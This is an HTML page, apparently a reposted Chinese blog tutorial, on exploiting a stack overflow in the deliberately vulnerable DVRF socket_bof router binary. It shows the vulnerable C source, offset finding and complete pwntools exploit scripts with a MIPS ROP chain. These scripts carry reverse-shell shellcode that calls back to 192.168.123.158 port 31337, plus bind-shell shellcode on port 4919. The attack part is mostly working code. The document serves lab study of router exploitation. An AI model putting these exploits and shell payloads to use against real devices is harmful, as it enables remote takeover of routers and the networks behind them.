@@ -1,0 +1,620 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>路由器漏洞挖掘之栈溢出反弹shell的payload构造 | 开发者问答集锦</title>
+    <meta property="og:title" content="路由器漏洞挖掘之栈溢出反弹shell的payload构造 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="路由器漏洞挖掘之栈溢出反弹shell的payload构造">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8D%E5%BC%B9shell%E7%9A%84payload%E6%9E%84%E9%80%A0/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">路由器漏洞挖掘之栈溢出反弹shell的payload构造</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<h2 id="前言">前言</h2>
+
+<p>前一篇讲到了 <code>ROP</code> 链的构造，最后直接使用调用 <code>execve</code> 函数的 <code>shellcode</code> 就可以直接
+<code>getshell</code>，但是实际路由器溢出的情况下都不会那么简单。</p>
+
+<p>这里再看一道 <code>DVRF</code> 的题，这道题是 <code>pwnable/ShellCode_Required</code> 下的 <code>socket_bof</code>。</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>直接查看源码：</p>
+
+<pre><code>#include 
+#include 
+#include 
+#include 
+#include 
+#include 
+
+// Pwnable Socket Program
+// By b1ack0wl
+// Stack Overflow
+
+int main(int argc, char **argv[])
+{
+
+if (argc &lt;2){
+
+printf(&quot;Usage: %s port_number - by b1ack0wl\n&quot;, argv[0]);
+exit(1);
+
+}
+
+    char str[500] = &quot;\0&quot;;
+    char endstr[50] = &quot;\0&quot;;
+    int listen_fd, comm_fd;
+    int retval = 0;
+    int option = 1;
+
+    struct sockaddr_in servaddr;
+
+    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+    bzero( &amp;servaddr, sizeof(servaddr));
+
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
+    servaddr.sin_port = htons(atoi(argv[1]));
+    printf(&quot;Binding to port %i\n&quot;, atoi(argv[1]));
+
+    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, sizeof(servaddr));
+    if (retval == -1){
+    printf(&quot;Error Binding to port %i\n&quot;, atoi(argv[1]));
+     exit(1);}
+
+   if(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (char*)&amp;option, sizeof(option)) &lt; 0){
+    printf(&quot;Setsockopt failed :(\n&quot;);
+    close(listen_fd);
+    exit(2);
+}
+
+
+    listen(listen_fd, 2);
+
+    comm_fd = accept(listen_fd, (struct sockaddr*) NULL, NULL);
+
+        bzero(str, 500);
+    write(comm_fd, &quot;Send Me Bytes:&quot;,14);
+        read(comm_fd,str,500);
+    sprintf(endstr, &quot;nom nom nom, you sent me %s&quot;, str);
+    printf(&quot;Sent back - %s&quot;,str);
+        write(comm_fd, endstr, strlen(endstr)+1);
+    shutdown(comm_fd, SHUT_RDWR);
+    shutdown(listen_fd, SHUT_RDWR);
+    close(comm_fd);
+    close(listen_fd);
+return 0x42;
+}
+</code></pre>
+
+<p>同样这里可以发现一处 <code>sprintf</code> 的栈溢出，把程序放入 <code>IDA</code> 中进行分析</p>
+
+<p>在 <code>0x00400D2C</code> 处调用了 <code>sprintf</code> 函数， <strong>将格式化后的字符串直接放到大小为<code>0x50</code> 的栈上</strong>，我们的输入如果大于
+0x50 的话就会产生栈溢出，这样我们就可以控制返回地址。</p>
+
+<p>这里和上一道题相似，同样这里需要我们使用 <code>ROP</code> 链来构造一个 <code>payload</code>。</p>
+
+<p>但是这里不同的是，这里我们是通过端口访问的。 <strong>如果我们这里<code>getshell</code> 了，这个 <code>shell</code>
+还是在服务端的，我们是无法访问的</strong>。所以这里我们需要构造一个通过端口能访问到的 <code>shellcode</code>。</p>
+
+<p>这里我们希望的效果是可以直接反弹 <code>shell</code> ，或者使得 <code>shellcode</code> 能够使服务端在远程某个端口开启一个 <code>shell</code>
+，我们就可以通过这个端口连接上，进而获取 <code>shell</code>。</p>
+
+<h3 id="gdb-调试方法">gdb 调试方法</h3>
+
+<p>这里因为程序是开了一个 <code>socket</code> 端口，调试方法稍微有点不太一样。但是还是可以用 <code>attach</code> 的方法来调试</p>
+
+<p>具体的方法是：</p>
+
+<ol>
+<li>先把程序用 <code>qemu</code> 跑起来，附加调试端口为 <code>23946</code></li>
+
+<li><p>用 <code>gdb-multiarch</code> 连接上 <code>23946</code> 端口：<code>target remote :23946</code>，程序断在 <code>_start</code> 函数处，在 <code>0x00400E1C</code> 处下一个断点（也就是 <code>lw $ra, 0x270+var_4($sp)</code> 的地方），c 继续运行</p></li>
+
+<li><p>再新开一个终端，<code>nc</code> 连接上之后，<code>send payload</code> 之后就可以在 <code>gdb</code> 中进行调试了。</p></li>
+</ol>
+
+<h3 id="确定偏移">确定偏移</h3>
+
+<p>控制 <code>ra</code> 之前还是需要先确定偏移地址。这边还是使用 <code>patternLocOffset.py</code> 工具来确定偏移，</p>
+
+<pre><code>python patternLocOffset.py -c -l 500 -f test2
+
+
+python patternLocOffset.py -s  0x41376241 -l 500
+</code></pre>
+
+<p>可以看到偏移是 51， <strong>后面的四个字节需要填充的 ra 寄存器的值。</strong></p>
+
+<h3 id="构造-payload">构造 payload</h3>
+
+<p>根据上一篇 <code>ROP</code> 链构造的思路， <strong>我们同样可以用原来的<code>ROP</code> 链来进行利用</strong>，这里不同的地方是 <code>shellcode</code>
+的差异，我们需要构造一个能够从端口访问的 <code>shellcode</code> 或者直接使用 <code>socket</code> 弹回一个 <code>shell</code>。</p>
+
+<ul>
+<li>在实际的路由器漏洞挖掘过程中，一般的栈溢出使用 <code>system</code> 函数来 <code>getshell</code> 都会存在问题，所以只能另辟蹊径。</li>
+</ul>
+
+<p><strong>所以这里的重点是<code>shellcode</code> 构造</strong>。</p>
+
+<hr />
+
+<p>我们先用原来的 <code>exp</code> 试试效果：</p>
+
+<pre><code>#!/usr/bin/python
+from pwn import *
+
+context.arch = 'mips'
+context.endian = 'little'
+
+libc_addr = 0x766e5000
+sleep_offset = 0x0002F2B0
+# sleep_end_addr = 0x767144c8
+
+
+shellcode = &quot;&quot;
+
+
+shellcode += &quot;\xff\xff\x06\x28&quot;  # slti $a2, $zero, -1
+shellcode += &quot;\x62\x69\x0f\x3c&quot;  # lui $t7, 0x6962
+shellcode += &quot;\x2f\x2f\xef\x35&quot;  # ori $t7, $t7, 0x2f2f
+shellcode += &quot;\xf4\xff\xaf\xaf&quot;  # sw $t7, -0xc($sp)
+shellcode += &quot;\x73\x68\x0e\x3c&quot;  # lui $t6, 0x6873
+shellcode += &quot;\x6e\x2f\xce\x35&quot;  # ori $t6, $t6, 0x2f6e
+shellcode += &quot;\xf8\xff\xae\xaf&quot;  # sw $t6, -8($sp)
+shellcode += &quot;\xfc\xff\xa0\xaf&quot;  # sw $zero, -4($sp)
+shellcode += &quot;\xf4\xff\xa4\x27&quot;  # addiu $a0, $sp, -0xc
+shellcode += &quot;\xff\xff\x05\x28&quot;  # slti $a1, $zero, -1
+shellcode += &quot;\xab\x0f\x02\x24&quot;  # addiu;$v0, $zero, 0xfab
+shellcode += &quot;\x0c\x01\x01\x01&quot;  # syscall 0x40404
+
+
+
+payload = 'a' * 51
+payload += p32(libc_addr + 0xAfe0)  # jr $ra
+
+
+payload += 'b' * (0x3c - 4 * 9)
+payload += 'a' * 4                               # s0
+payload += p32(libc_addr + 0x21C34)              # s1
+payload += 'a' * 4                               # s2
+payload += p32(libc_addr + sleep_offset)         # s3
+payload += 'a' * 4                               # s4
+payload += 'a' * 4                               # s5
+payload += 'a' * 4                               # s6
+payload += 'a' * 4                               # s7
+payload += 'a' * 4                               # fp
+payload += p32(libc_addr + 0x2FB10)              # ra
+
+
+#---------------stack 2-------------------
+
+payload += 'c' * 0x24
+payload += p32(libc_addr + 0x000214A0)           # s3
+payload += 'd' * 4                               # s4
+payload += p32(libc_addr + 0xAfe0)               # ra
+
+#---------------stack 3-------------------
+payload += 'a' * (0x3c-4*9)
+payload += p32(libc_addr + 0x000214A0)     # s0
+payload += 'a' * 4                               # s1
+payload += 'a' * 4                               # s2
+payload += 'a' * 4                               # s3
+payload += 'a' * 4                               # s4
+payload += 'a' * 4                               # s5
+payload += 'a' * 4                               # s6
+payload += 'a' * 4                               # s7
+payload += 'a' * 4                               # fp
+payload += p32(libc_addr + 0x0001B230)           # ra
+
+
+payload += 'f' * 0x28
+payload += shellcode
+
+
+r = remote('127.0.0.1',55555)
+r.recvuntil('Send Me Bytes:')
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+
+<p>运行起来，在服务端可以看到，这里确实可以 <code>getshell</code>。</p>
+
+<h3 id="shellcode-的选择和构造">shellcode 的选择和构造</h3>
+
+<p>这里的 <code>shellcode</code> 可以选择两种类型， <strong>一种是在本地传一个<code>shell</code> 绑定到某个端口，另一种是直接反弹 <code>shell</code>。</strong></p>
+
+<p>这里的 <code>shellcode</code> 可以自己开发，也可以直接用网上现成的。自己开发的话比较耗时难度也比较大，这边就直接使用这里的。</p>
+
+<h4 id="反弹-shell">反弹 shell</h4>
+
+<p>先选择一个反弹 <code>shell</code> 的 <code>shellcode</code>，在下面这个链接中，可以看到这边是将 <code>shell</code> 反弹到了 <code>192.168.1.177</code>
+这个 ip 的 <code>31337</code> 端口。</p>
+
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-860.php">http://shell-storm.org/shellcode/files/shellcode-860.php</a></p>
+
+<p>我们使用的话之 <strong>直接更改他的 ip 地址就行了</strong> ，也就是对 <code>li $a1, 0xB101A8C0 #192.168.1.177</code>
+这条汇编指令进行更改。</p>
+
+<p>如何更改呢？这边就需要用到 <code>pwntools</code> 的 <code>asm</code> 函数。</p>
+
+<p>首先，我们需要把目的 ip 地址转化为 16 进制，这里就拿笔者本机来演示。这里我本机的 IP 是 <code>192.168.123.158</code></p>
+
+<p>转化成 16 进制为：<code>0x9e7ba8c0</code></p>
+
+<p>那么这里的汇编语句就是：<code>li $a1,0x9e7ba8c0</code></p>
+
+<p>导入 <code>pwntools.asm</code> 函数中：</p>
+
+<p>得到相应汇编语句的 <code>hex</code> 值，替换掉 <code>payload</code> 原来的 <code>hex</code> 值就行了。即：</p>
+
+<pre><code>stg3_SC = &quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;
+stg3_SC += &quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;
+stg3_SC += &quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;
+stg3_SC += &quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;
+stg3_SC += &quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;
+stg3_SC += &quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;
+#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;          # 192.168.1.177
+stg3_SC += &quot;\xf8\xff\xa5\xaf\x7b\x9e\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;           # 192.168.123.158
+stg3_SC += &quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;
+stg3_SC += &quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;
+stg3_SC += &quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;
+stg3_SC += &quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;
+stg3_SC += &quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;
+stg3_SC += &quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;
+</code></pre>
+
+<p><code>nc</code> 监听 31337 端口，运行 <code>exp</code> 成功反弹一个 <code>shell</code>：</p>
+
+<h4 id="绑定到相应端口">绑定到相应端口</h4>
+
+<p>这里的 shellcode 使用这里的：<br />
+<a href="http://shell-storm.org/shellcode/files/shellcode-81.php">http://shell-storm.org/shellcode/files/shellcode-81.php</a></p>
+
+<p>也就是开启一个 <code>bash</code> 监听本地的 <code>4919</code> 端口。</p>
+
+<pre><code>bind_port_shellcode = &quot;\xe0\xff\xbd\x27\xfd\xff\x0e\x24\x27\x20\xc0\x01\x27\x28\xc0\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\xff\xff\x50\x30\xef\xff\x0e\x24\x27\x70\xc0\x01\x13\x37\x0d\x24\x04\x68\xcd\x01\xff\xfd\x0e\x24\x27\x70\xc0\x01\x25\x68\xae\x01\xe0\xff\xad\xaf\xe4\xff\xa0\xaf\xe8\xff\xa0\xaf\xec\xff\xa0\xaf\x25\x20\x10\x02\xef\xff\x0e\x24\x27\x30\xc0\x01\xe0\xff\xa5\x23\x49\x10\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02\x01\x01\x05\x24\x4e\x10\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02\xff\xff\x05\x28\xff\xff\x06\x28\x48\x10\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\xff\xff\x50\x30\x25\x20\x10\x02\xfd\xff\x0f\x24\x27\x28\xe0\x01\xdf\x0f\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02\x01\x01\x05\x28\xdf\x0f\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\x25\x20\x10\x02\xff\xff\x05\x28\xdf\x0f\x02\x24\x0c\x01\x01\x01\x50\x73\x0f\x24\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xdb\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xf0\xff\xa4\xaf\xf4\xff\xa0\xaf\xf0\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh&quot;
+</code></pre>
+
+<p>直接替换原来 <code>payload</code>：</p>
+
+<p>但是这里有点问题，执行完 exp 却开启了别的端口，直接连接上去程序会直接崩溃。所以还是使用上面反弹 <code>shell</code> 的 exp 吧。</p>
+
+<h3 id="exp">exp</h3>
+
+<pre><code>#!/usr/bin/python
+from pwn import *
+
+context.arch = 'mips'
+context.endian = 'little'
+
+libc_addr = 0x766e5000
+sleep_offset = 0x0002F2B0
+
+stg3_SC = &quot;&quot;
+stg3_SC = &quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;
+stg3_SC += &quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;
+stg3_SC += &quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;
+stg3_SC += &quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;
+stg3_SC += &quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;
+stg3_SC += &quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;
+stg3_SC += &quot;\xf8\xff\xa5\xaf\x7b\x9e\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;       # 192.168.123.158
+stg3_SC += &quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;
+stg3_SC += &quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;
+stg3_SC += &quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;
+stg3_SC += &quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;
+stg3_SC += &quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;
+stg3_SC += &quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;
+
+
+
+payload = 'a' * 51
+payload += p32(libc_addr + 0xAfe0)  # jr $ra
+
+
+payload += 'b' * (0x3c - 4 * 9)
+payload += 'a' * 4                               # s0
+payload += p32(libc_addr + 0x21C34)              # s1
+payload += 'a' * 4                               # s2
+payload += p32(libc_addr + sleep_offset)         # s3
+payload += 'a' * 4                               # s4
+payload += 'a' * 4                               # s5
+payload += 'a' * 4                               # s6
+payload += 'a' * 4                               # s7
+payload += 'a' * 4                               # fp
+payload += p32(libc_addr + 0x2FB10)              # ra
+
+
+#---------------stack 2-------------------
+
+payload += 'c' * 0x24
+payload += p32(libc_addr + 0x000214A0)           # s3
+payload += 'd' * 4                               # s4
+payload += p32(libc_addr + 0xAfe0)               # ra
+
+#---------------stack 3-------------------
+payload += 'a' * (0x3c-4*9)
+payload += p32(libc_addr + 0x000214A0)     # s0
+payload += 'a' * 4                               # s1
+payload += 'a' * 4                               # s2
+payload += 'a' * 4                               # s3
+payload += 'a' * 4                               # s4
+payload += 'a' * 4                               # s5
+payload += 'a' * 4                               # s6
+payload += 'a' * 4                               # s7
+payload += 'a' * 4                               # fp
+payload += p32(libc_addr + 0x0001B230)           # ra
+
+
+payload += 'f' * 0x28
+payload += stg3_SC
+
+r = remote('127.0.0.1',55555)
+r.recvuntil('Send Me Bytes:')
+
+r.sendline(payload)
+
+r.interactive()
+</code></pre>
+
+<h2 id="总结">总结</h2>
+
+<p>在实际的路由器栈溢出时，如果执行 <code>execve</code> 函数没办法 <code>getshell</code> 时，可以试试上面反弹 <code>shell</code> 的方式。</p>
+
+<p>转载于:<a href="https://www.cnblogs.com/H4lo/p/10580433.html">https://www.cnblogs.com/H4lo/p/10580433.html</a></p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
